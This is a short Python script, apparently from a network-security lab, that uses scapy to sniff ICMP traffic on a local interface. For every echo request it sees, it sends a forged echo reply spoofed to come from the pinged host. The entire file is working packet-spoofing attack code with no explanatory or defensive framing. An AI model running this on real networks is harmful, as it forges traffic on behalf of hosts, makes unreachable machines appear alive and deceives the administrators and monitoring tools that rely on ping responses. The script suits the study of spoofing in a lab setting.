#!/usr/bin/env python3

from scapy.all import *

def spoofingICMP(pkt):
    if(pkt[2].type == 8):
        dest = pkt[1].dst
        sorc = pkt[1].src
        seq = pkt[2].seq
        load = pkt[3].load

        p=IP(src=dest, dst = sorc)/ICMP(type=0, id =pkt[2].id, seq =seq)/load
        send(p)
	
pkt = sniff(iface='enp0s3', filter = 'icmp', prn=spoofingICMP)

